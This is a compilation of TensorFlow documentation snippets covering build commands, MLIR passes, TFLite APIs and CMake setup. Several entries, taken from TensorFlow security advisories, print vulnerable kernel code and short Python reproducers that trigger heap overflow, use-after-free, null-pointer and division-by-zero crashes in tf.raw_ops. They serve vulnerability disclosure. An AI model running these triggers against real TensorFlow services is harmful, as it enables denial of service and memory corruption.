DESCRIPTION: Runs the benchmark_model tool on the Linux host, dynamically loading the sample stable delegate using the generated settings file and benchmarking a provided TFLite model file (e.g., add.bin).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_9

LANGUAGE: bash
CODE:
```
$(bazel info -c opt bazel-bin)/tensorflow/lite/tools/benchmark/benchmark_model \
  --stable_delegate_settings_file=$(pwd)/stable_delegate_settings.json \
    --graph=$(pwd)/tensorflow/lite/testdata/add.bin
```

----------------------------------------

TITLE: Vulnerable UnicodeEncode Implementation (C++)
DESCRIPTION: This C++ snippet shows the vulnerable part of the `tf.raw_ops.UnicodeEncode` implementation found in `unicode_ops.cc`. It retrieves and accesses properties (`flat`, `dim_size`) of the `input_splits` tensor using `input_splits.dim_size(0)`, *before* checking for an empty or valid input. When `input_splits` is empty, this leads to binding a reference to a null pointer, causing undefined behavior (CVE-2021-37667).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-141.md#_snippet_1

LANGUAGE: c++
CODE:
```
  const Tensor& input_splits = context->input(1);
  const auto input_splits_flat = input_splits.flat<SPLITS_TYPE>();
  TensorShape output_shape({input_splits.dim_size(0) - 1});

```

----------------------------------------

TITLE: Building Benchmark APK - Bazel Shell
DESCRIPTION: Builds the TensorFlow Lite Delegate Performance Benchmark Android application package (.apk) using the Bazel build tool. This command is configured for the android_arm64 architecture and uses optimized compilation (`-c opt`). Requires a correctly set up Android NDK/SDK environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
bazel build -c opt \
  --config=android_arm64 \
  tensorflow/lite/tools/benchmark/experimental/delegate_performance/android:delegate_performance_benchmark
```

----------------------------------------

TITLE: Pruning Unreachable Ops in TF Executor Graph (Before)
DESCRIPTION: This MLIR snippet shows a `tf_executor.graph` containing several operations: `%transitive_reachable_data`, `%reachable_data`, `%unreachable_data`, `%transitive_reachable_control`, `%reachable_control`, and `%unreachable_control`. Only `%reachable_data` and `%reachable_control` are fetched. This graph is an example input for the `-tf-executor-graph-pruning` pass, which removes ops not transitively connected to the `tf_executor.fetch` op.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_11

LANGUAGE: MLIR
CODE:
```
func @graph(%arg0: tensor<i32>, %arg1: tensor<i32>) -> tensor<i32> {
  %graph = tf_executor.graph {
    %transitive_reachable_data:2 = tf_executor.island wraps "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
    %reachable_data:2 = tf_executor.island wraps "tf.Identity"(%transitive_reachable_data#0) : (tensor<i32>) -> tensor<i32>
    %unreachable_data:2 = tf_executor.island wraps "tf.Const"() {value = dense<0> : tensor<i32>} : () -> tensor<i32>
    %transitive_reachable_control = tf_executor.island wraps "tf.NoOp"() : () -> ()
    %reachable_control = tf_executor.island(%transitive_reachable_control) wraps "tf.NoOp"() : () -> ()
    %unreachable_control = tf_executor.island wraps "tf.NoOp"() : () -> tensor<i32>
    tf_executor.fetch %reachable_data#0, %reachable_control : tensor<i32>, tensor<i32>
  }
  return %graph : tensor<i32>
}
```

----------------------------------------

TITLE: Vulnerable PyArrayDescr_to_TF_DataType Function / TensorFlow / C++
DESCRIPTION: This C++ snippet shows the `PyArrayDescr_to_TF_DataType` function, specifically the call to `PyDict_Next`. The vulnerability (CVE-2021-29513) occurs here because the `descr->fields` dictionary is null when the function is called with a problematic `NPY_VOID` type descriptor, causing `PyDict_Next` to attempt dereferencing a null pointer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-003.md#_snippet_7

LANGUAGE: cpp
CODE:
```
Status PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,
                                   TF_DataType* out_tf_datatype) {
  PyObject* key;
  PyObject* value;
  Py_ssize_t pos = 0;
  if (PyDict_Next(descr->fields, &pos, &key, &value)) {
    ...
  }
}
```

----------------------------------------

TITLE: Creating Output Directory Python
DESCRIPTION: Uses the pathlib module to define a directory path for storing the converted TensorFlow Lite models and creates the directory if it doesn't already exist, including any necessary parent directories.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
tflite_models_dir = pathlib.Path("/tmp/mnist_tflite_models/")
tflite_models_dir.mkdir(exist_ok=True, parents=True)
```

----------------------------------------

TITLE: Creating Directory for TFLite Models Python
DESCRIPTION: Creates a directory on the filesystem to store the generated TensorFlow Lite model files. It uses `pathlib` for path manipulation and ensures the directory exists, creating parent directories if necessary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
tflite_models_dir = pathlib.Path("/tmp/mnist_tflite_models/")
tflite_models_dir.mkdir(exist_ok=True, parents=True)
```

----------------------------------------

TITLE: Executing Matrix Multiply with TensorFlow Python Session
DESCRIPTION: This snippet shows how to perform a basic matrix multiplication using TensorFlow's Python API. It defines two constant tensors, creates a session, runs the graph to compute the matrix product, and prints the result. It requires the TensorFlow Python library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/public/README.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

with tf.Session():
  input1 = tf.constant(1.0, shape=[1, 1], name="input1")
  input2 = tf.constant(2.0, shape=[1, 1], name="input2")
  output = tf.matmul(input1, input2)

  # Run graph and fetch the output
  result = output.eval()
  print result
```

----------------------------------------

TITLE: Initializing CluRequest Python Class
DESCRIPTION: This snippet shows the constructor signature for the `CluRequest` class. It is used to create a new instance of `CluRequest` by providing a list of utterances representing the conversation history.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/CluRequest.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.CluRequest(
    utterances: List[str]
)
```

----------------------------------------

TITLE: Running TensorFlow Graph Transform Tool (Bash)
DESCRIPTION: This command sequence builds and executes the `transform_graph` tool using Bazel. It demonstrates the basic usage, specifying input and output graph files, defining graph inputs and outputs, and listing multiple transformations to apply sequentially using the `--transforms` argument. The transforms are passed as a single multi-line string within single quotes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
bazel build tensorflow/tools/graph_transforms:transform_graph
bazel-bin/tensorflow/tools/graph_transforms/transform_graph \
--in_graph=tensorflow_inception_graph.pb \
--out_graph=optimized_inception_graph.pb \
--inputs='Mul:0' \
--outputs='softmax:0' \
--transforms='
strip_unused_nodes(type=float, shape="1,299,299,3")
remove_nodes(op=Identity, op=CheckNumerics)
fold_old_batch_norms
'
```

----------------------------------------

TITLE: Example Using DynamicSlice on 2D Array
DESCRIPTION: This pseudocode illustrates the XLA DynamicSlice operation on a 2-dimensional array. It shows how to extract a rectangular sub-array starting at dynamic indices (specified by 's') with a fixed size [2, 2] in this case.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_18

LANGUAGE: pseudocode
CODE:
```
let b =
{ {0.0,  1.0,  2.0},
{3.0,  4.0,  5.0},
{6.0,  7.0,  8.0},
{9.0, 10.0, 11.0} }
let s = {2, 1}

DynamicSlice(b, s, {2, 2}) produces:
{ { 7.0,  8.0},
{10.0, 11.0} }
```

----------------------------------------

TITLE: Recursive Application of Reduce Function (Conceptual)
DESCRIPTION: This pseudocode demonstrates the iterative application of the defined reduction function `f` for a 1-D input. Each step applies the function to the result of the previous step and the next input element pair (value, index).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_27

LANGUAGE: Python
CODE:
```
f_0 = f(I_V, I_K, V_0, K_0)
f_1 = f(f_0.first, f_0.second, V_1, K_1)
...
f_(N-1) = f(f_(N-2).first, f_(N-2).second, V_(N-1), K_(N-1))
```

----------------------------------------

TITLE: Generating TFLite Micro Projects with Optimized Kernels with Make | bash
DESCRIPTION: Generates standalone project files, similar to `generate_projects`, but includes optimized kernel implementations from a specified subdirectory. Replace `<subdirectory_name>` with the name of the folder containing the optimized kernels (e.g., `cmsis-nn`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/library.md#_snippet_6

LANGUAGE: bash
CODE:
```
make -f tensorflow/lite/micro/tools/make/Makefile TAGS=<subdirectory_name> generate_projects
```

----------------------------------------

TITLE: Binding XLA FFI Handler for Generic Buffers
DESCRIPTION: Shows how to create an XLA FFI handler that accepts and returns buffer parameters of any data type and any number of dimensions using `AnyBuffer`. The handler can then access the untyped data pointers for processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_2

LANGUAGE: C++
CODE:
```
// Buffers of any number of dimensions and data type.
auto handler = Ffi::Bind().Arg<AnyBuffer>().Ret<AnyBuffer>().To(
    [](AnyBuffer arg, Result<AnyBuffer> res) -> Error {
      void* arg_data = arg.untyped_data();
      void* res_data = res->untyped_data();
      return Error::Success();
    });
```

----------------------------------------

TITLE: Processing Background Audio Samples Python
DESCRIPTION: Iterates through the downloaded background audio files, which are typically long recordings. It uses `librosa` and `soundfile` to split each long file into one-second segments, saving each segment as a new WAV file in a dedicated background directory. This prepares the background data into fixed-size samples suitable for the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
# Create a list of all the background wav files
files = glob.glob(os.path.join('./dataset-speech/_background_noise_', '*.wav'))
files = files + glob.glob(os.path.join('./dataset-background', '*.wav'))

background_dir = './background'
os.makedirs(background_dir, exist_ok=True)

# Loop through all files and split each into several one-second wav files
for file in files:
  filename = os.path.basename(os.path.normpath(file))
  print('Splitting', filename)
  name = os.path.splitext(filename)[0]
  rate = librosa.get_samplerate(file)
  length = round(librosa.get_duration(filename=file))
  for i in range(length - 1):
    start = i * rate
    stop = (i * rate) + rate
    data, _ = sf.read(file, start=start, stop=stop)
    sf.write(os.path.join(background_dir, name + str(i) + '.wav'), data, rate)
```

----------------------------------------

TITLE: Calling Custom Multiplexer Op in Python
DESCRIPTION: Demonstrates the basic syntax for calling the custom multiplexer operation, named `multiplex`, on input tensors `condition`, `x`, and `y`. This snippet shows the function signature expected by the op's Python wrapper.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_0

LANGUAGE: python
CODE:
```
multiplex_1_op.multiplex(condition, x, y)                                        # doctest: skip
```

----------------------------------------

TITLE: Parsing DepthwiseConv2D FlatBuffer Options (C++)
DESCRIPTION: This C++ function demonstrates how to parse the `DepthwiseConv2DOptions` from the FlatBuffer `Operator` and populate the `TfLiteDepthwiseConvParams` C structure. It includes logic to read the new dilation factors, relying on FlatBuffers' default values (1) for older models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_4

LANGUAGE: C++
CODE:
```
TfLiteStatus ParseDepthwiseConv2D(const Operator* op,
                                  ErrorReporter* error_reporter,
                                  BuiltinDataAllocator* allocator,
                                  void** builtin_data) {
  CheckParsePointerParams(op, error_reporter, allocator, builtin_data);

  SafeBuiltinDataAllocator safe_allocator(allocator);

  std::unique_ptr<TfLiteDepthwiseConvParams,
                  SafeBuiltinDataAllocator::BuiltinDataDeleter>
      params = safe_allocator.Allocate<TfLiteDepthwiseConvParams>();
  TF_LITE_ENSURE(error_reporter, params != nullptr);

  const DepthwiseConv2DOptions* schema_params =
      op->builtin_options_as_DepthwiseConv2DOptions();

  if (schema_params != nullptr) {
    params->padding = ConvertPadding(schema_params->padding());
    params->stride_width = schema_params->stride_w();
    params->stride_height = schema_params->stride_h();
    params->depth_multiplier = schema_params->depth_multiplier();
    params->activation =
        ConvertActivation(schema_params->fused_activation_function());

    params->dilation_width_factor = schema_params->dilation_w_factor();
    params->dilation_height_factor = schema_params->dilation_h_factor();
  }

  *builtin_data = params.release();
  return kTfLiteOk;
}
```

----------------------------------------

TITLE: Representing Conditional Control Flow with tf.IfRegion - MLIR
DESCRIPTION: Demonstrates how the standard MLIR TensorFlow dialect (`tf`) uses regions to represent conditional control flow, like the `tf.IfRegion` operation. The snippet shows separate regions for the true and false branches, each containing a sequence of operations and ending with a `tf.Yield`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/README.md#_snippet_7

LANGUAGE: MLIR
CODE:
```
  %0, %1, %2 = "tf.IfRegion"(%arg0) ({
     %t0 = "tf.Abs"(%arg1) : (tensor<2xf32>) -> tensor<2xf32>
     %t1 = "tf.Acos"(%arg1) : (tensor<2xf32>) -> tensor<2xf32>
     %t2 = "tf.Acosh"(%arg1) : (tensor<2xf32>) -> tensor<2xf32>
    "tf.Yield"(%t0, %t1, %t2) : (tensor<2xf32>, tensor<2xf32>, tensor<2xf32>) -> ()
  }, {
     %e0 = "tf.Neg"(%arg1) : (tensor<2xf32>) -> tensor<2xf32>
     %e1 = "tf.Relu"(%arg1) : (tensor<2xf32>) -> tensor<2xf32>
     %e2 = "tf.Sin"(%arg1) : (tensor<2xf32>) -> tensor<2xf32>
     "tf.Yield"(%e0, %e1, %e2) : (tensor<2xf32>, tensor<2xf32>, tensor<2xf32>)
  }): (tensor<i1>) -> (tensor<2xf32>, tensor<2xf32>, tensor<2xf32>)
  %3 = "tf.Add"(%0, %1) : (tensor<2xf32>, tensor<2xf32>) -> tensor<2xf32>
  %4 = "tf.Add"(%2, %3) : (tensor<2xf32>, tensor<2xf32>) -> tensor<2xf32>
```

----------------------------------------

TITLE: Reproducing FractionalAvgPoolGrad Heap Overflow - Python/TensorFlow
DESCRIPTION: This Python snippet demonstrates how to trigger a heap buffer overflow vulnerability (CVE-2021-37651) in `tf.raw_ops.FractionalAvgPoolGrad`. It uses specific input parameters, notably an empty `orig_input_tensor_shape` and particular pooling sequences, to cause the operation to access memory out of bounds in vulnerable TensorFlow versions. Running this code on an unpatched version should reveal the security issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-125.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.FractionalAvgPoolGrad(
  orig_input_tensor_shape=[0,1,2,3],
  out_backprop = np.array([[[[541],[541]],[[541],[541]]]]),
  row_pooling_sequence=[0, 0, 0, 0, 0],
  col_pooling_sequence=[-2, 0, 0, 2, 0],
  overlapping=True)
```

----------------------------------------

TITLE: Triggering Conv3D Division by Zero Vulnerability - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger a division-by-zero vulnerability in TensorFlow's `tf.raw_ops.Conv3D`. It provides input and filter tensors with zero dimensions, specifically targeting the vulnerability described in the C++ kernel logic, leading to an internal error. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-006.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 23, 1])
```

----------------------------------------

TITLE: Configuring CMake Project and Standard (CMake)
DESCRIPTION: Sets the minimum required CMake version, defines the project name as `TestAOT`, and specifies the required C++ standard for the build. This ensures compatibility with necessary CMake features and enforces the use of C++17 for compiling the project's source code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/pip_test/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
cmake_minimum_required(VERSION 3.14)
project(TestAOT)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
```

----------------------------------------

TITLE: Demonstrating BlockLSTMGradV2 Segfault in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the TFSA-2022-096 vulnerability by calling the `tf.raw_ops.BlockLSTMGradV2` operation with inputs that violate the expected rank requirements. Specifically, it initializes all tensor inputs with a shape of `[1,1,1]`, which causes a segfault due to inadequate validation of input tensor ranks by the operation, leading to a denial of service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-096.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

use_peephole = False
seq_len_max = tf.constant(1, shape=[], dtype=tf.int64)
x = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
cs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
w = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
b = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
i = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
cs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
f = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
o = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
ci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
co = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
cs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
tf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)
```

----------------------------------------

TITLE: Demonstrating Null Pointer Dereference in MatrixDiagPartV2 Python
DESCRIPTION: This snippet demonstrates how to trigger a null pointer dereference or invalid behavior in TensorFlow's `tf.raw_ops.MatrixDiagPartV2` by providing an empty list `[]` as the `padding_value` argument. It requires the TensorFlow library. The input and k arguments are tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-118.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.MatrixDiagPartV2(
  input=tf.ones(2,dtype=tf.int32),
  k=tf.ones(2,dtype=tf.int32),
  padding_value=[])
```

----------------------------------------

TITLE: Triggering BoostedTreesCreateEnsemble Use After Free - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the use after free vulnerability in `tf.raw_ops.BoostedTreesCreateEnsemble`. It uses a `tf.Variable` handle and specific arguments to cause the operation to fail initialization incorrectly, leading to the security flaw.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-126.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

v= tf.Variable([0.0])
tf.raw_ops.BoostedTreesCreateEnsemble(
  tree_ensemble_handle=v.handle,
  stamp_token=[0],
  tree_ensemble_serialized=['0'])
```

----------------------------------------

TITLE: Bad Practice: Lambda Inlined in Expression (Pre-TF 2.3) Python
DESCRIPTION: Shows another practice to avoid in pre-TF 2.3: inlining a lambda function directly as an argument within another function call or complex expression. This can interfere with reliable source code extraction by `inspect.getsource`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_58

LANGUAGE: Python
CODE:
```
# Bad - inlined in another expression
foo(lambda x, y: x + y, bar)
```

----------------------------------------

TITLE: PAD Token Constant in AverageWordVecSpec
DESCRIPTION: Represents the constant string used as the padding token in the vocabulary and sequences. Padding is used to make all sequences the same length.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_12

LANGUAGE: python
CODE:
```
'<PAD>'
```

----------------------------------------

TITLE: START Token Constant in AverageWordVecSpec
DESCRIPTION: Represents the constant string used as the start-of-sequence token in the vocabulary and sequences. Indicates the beginning of a text input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_13

LANGUAGE: python
CODE:
```
'<START>'
```

----------------------------------------

TITLE: Evaluating Operation Result - C++
DESCRIPTION: Provides the overloaded function signatures for the `Eval` step. This function computes the actual operation result, filling the output tensor buffers. It requires input tensor data and output buffer to be set and allocated, with shapes matching the `Prepare` step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_3

LANGUAGE: C++
CODE:
```
// When an unknown number of tensors can be passed.
Status Eval(ExampleOp& op, const absl::Span<Tensor>& inputs, absl::Span<Tensor>& outputs);
// When the number of input/output tensors is known at compile time.
Status Eval(ExampleOp& op, const Tensor& lhs, const Tensor& rhs, Tensor& output);
```

----------------------------------------

TITLE: Example Using CustomCall in XLA Computation
DESCRIPTION: This pseudocode demonstrates how the CustomCall operation is used within an XLA computation. It defines two input tensors ('x' and 'y') and invokes 'CustomCall', specifying the target function name ('myfunc'), the input arguments, and the expected output shape.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_13

LANGUAGE: pseudocode
CODE:
```
let x = f32[2] {1,2};
let y = f32[2x3] {{10, 20, 30}, {40, 50, 60}};

CustomCall("myfunc", {x, y}, f32[3x3])
```

----------------------------------------

TITLE: Define Static Library (CMake)
DESCRIPTION: Creates a static library named 'tf_xla_runtime'. Static libraries are archives of object files that are linked into executables or other libraries at link time. It uses the object files generated by the 'tf_xla_runtime_objects' target as its content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
add_library(tf_xla_runtime STATIC
  $<TARGET_OBJECTS:tf_xla_runtime_objects>
)
```

----------------------------------------

TITLE: Break Statement in While Loop Transformed Output Python
DESCRIPTION: Output code generated by AutoGraph showing the transformation of a `break` statement in a `while` loop using an extra control boolean (`break_`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_28

LANGUAGE: Python
CODE:
```
break_ = False
while i < 10 and not break_:
  if i > 3:
    break_ = True
    continue  # The continue statement is also rewritten in a subsequent pass
  i += 1
```

----------------------------------------

TITLE: Preparing Operation for Evaluation - C++
DESCRIPTION: Shows the overloaded function signatures for the `Prepare` step. This step sets up reusable data, performs pre-computations, and computes output tensor dimensions, especially for dynamic tensors. Requires input tensor shapes to be known and sets output tensor shapes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_2

LANGUAGE: C++
CODE:
```
// When an unknown number of tensors can be passed.
Status Prepare(ExampleOp& op, const absl::Span<Tensor>& inputs, absl::Span<Tensor>& outputs);
// When the number of input/output tensors is known at compile time we can provide an overload
Status Prepare(ExampleOp& op, const Tensor& lhs, const Tensor& rhs, Tensor& output);
```

----------------------------------------

TITLE: Creating BertTokenizerOptionsT from Object - Python
DESCRIPTION: This class method initializes a new `BertTokenizerOptionsT` object by copying data from an existing instance. It takes one parameter, `bertTokenizerOptions`, which is an existing `BertTokenizerOptionsT` object. This provides a way to create a mutable copy or a new instance based on an already parsed object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptionsT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    bertTokenizerOptions
)
```

----------------------------------------

TITLE: List hlo-opt Compilation Stages
DESCRIPTION: This command uses `hlo-opt` to list the available compilation output stages for a specific platform, such as CUDA. This helps understand the intermediate representations available for inspection.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_7

LANGUAGE: Command Line
CODE:
```
hlo-opt --platform=CUDA --list-stages
```

----------------------------------------

TITLE: Running TensorFlow C++ Label Image Demo Default Bash
DESCRIPTION: Executes the C++ label image binary generated by Bazel. This command runs the image classification demo using a default image that is compiled into the application. It outputs the top classification results and their confidence scores to the console. The binary must exist in the bazel-bin directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/label_image/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
bazel-bin/tensorflow/examples/label_image/label_image
```

----------------------------------------

TITLE: TfLiteDepthwiseConvParams C Struct (Original)
DESCRIPTION: This snippet shows the original C structure `TfLiteDepthwiseConvParams` used by TFLite kernels to hold parameters for the Depthwise Convolution operation. It mirrors the parameters defined in the initial FlatBuffer schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_2

LANGUAGE: C
CODE:
```
typedef struct {
  TfLitePadding padding;
  int stride_width;
  int stride_height;
  int depth_multiplier;
  TfLiteFusedActivation activation;
} TfLiteDepthwiseConvParams;
```

----------------------------------------

TITLE: Demonstrating Illegal TF Break in Python Loop Python
DESCRIPTION: Shows an example where a `break` statement inside a standard Python `for` loop is conditionally executed based on a TensorFlow tensor comparison. This is illegal because a Python loop cannot contain a TensorFlow-dependent control flow operation like a break.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_45

LANGUAGE: Python
CODE:
```
for i in range(10):
  if tf.greater(i, 3):
    break  # error - TF break inside Python loop
```

----------------------------------------

TITLE: Run Bazel Tests TF GPU (Shell)
DESCRIPTION: Executes `bazel test` for TensorFlow GPU targets. It applies extensive build and test tag filters (including GPU tags), uses GPU-specific release and RBE configurations, enables PYWRAP rules, configures output, profiling, and limits tests to C++ and Python languages. It specifies multiple target patterns, including exclusions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_11

LANGUAGE: shell
CODE:
```
bazel test --build_tag_filters=-no_oss,-tf_tosa,-oss_excluded,-oss_serial,-tpu,-benchmark-test,-v1only,-no_gpu,-no_gpu_presubmit,-no_cuda11,+gpu --test_tag_filters=-no_oss,-tf_tosa,-oss_excluded,-oss_serial,-tpu,-benchmark-test,-v1only,-no_gpu,-no_gpu_presubmit,-no_cuda11,+gpu --config=release_gpu_linux --config=rbe_linux_cuda --repo_env=USE_PYWRAP_RULES=True --verbose_failures --test_output=errors --profile=profile.json.gz --test_lang_filters=cc,py --color=yes -- //tensorflow/compiler/... -//tensorflow/compiler/tf2tensorrt/... //tensorflow/python/... -//tensorflow/python/distribute/... -//tensorflow/python/kernel_tests/... -//tensorflow/python/data/... -//tensorflow/python/compiler/tensorrt/...
```

----------------------------------------

TITLE: Running TFLite Image Classification Script - sh
DESCRIPTION: Executes the `label_image.py` Python script using `python3`, providing the paths to the downloaded TFLite model, labels file, and image as command-line arguments to perform the image classification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/python/README.md#_snippet_1

LANGUAGE: sh
CODE:
```
python3 label_image.py \
  --model_file /tmp/mobilenet_v1_1.0_224.tflite \
  --label_file /tmp/labels.txt \
  --image /tmp/grace_hopper.bmp
```

----------------------------------------

TITLE: Finding Required Dependencies
DESCRIPTION: This section uses `find_package` to locate various external dependencies required by TensorFlow Lite, such as absl, Eigen3, FlatBuffers, gemmlowp, cpuinfo, ml_dtypes, and ruy. It also conditionally finds `NEON_2_SSE` if the system processor is x86 and appends it to `TFLITE_TARGET_DEPENDENCIES`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_13

LANGUAGE: CMake
CODE:
```
set(TFLITE_TARGET_DEPENDENCIES "")
# Find TensorFlow Lite dependencies.
find_package(absl REQUIRED)
find_package(Eigen3 REQUIRED)
find_package(farmhash REQUIRED)
find_package(fft2d REQUIRED)
find_package(FlatBuffers REQUIRED)
find_package(gemmlowp REQUIRED)
if (NOT CMAKE_SYSTEM_PROCESSOR OR CMAKE_SYSTEM_PROCESSOR MATCHES "x86")
  find_package(NEON_2_SSE REQUIRED)
  list(APPEND TFLITE_TARGET_DEPENDENCIES NEON_2_SSE::NEON_2_SSE)
endif()
find_package(cpuinfo REQUIRED)  #CPUINFO is used by XNNPACK and RUY library
find_package(ml_dtypes REQUIRED)
find_package(ruy REQUIRED)
```

----------------------------------------

TITLE: Installing TensorFlow Nightly Python
DESCRIPTION: This command installs the latest nightly build of the TensorFlow Python package using pip. It is specified as a prerequisite to ensure access to the necessary features, such as the experimental new converter for fused LSTM. This step must be executed before running subsequent code that depends on these features.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/Keras_LSTM_fusion_Codelab.ipynb#_snippet_0

LANGUAGE: Python
CODE:
```
!pip install tf-nightly
```

----------------------------------------

TITLE: Get Config Method Python
DESCRIPTION: Retrieves the configuration of the model specification.
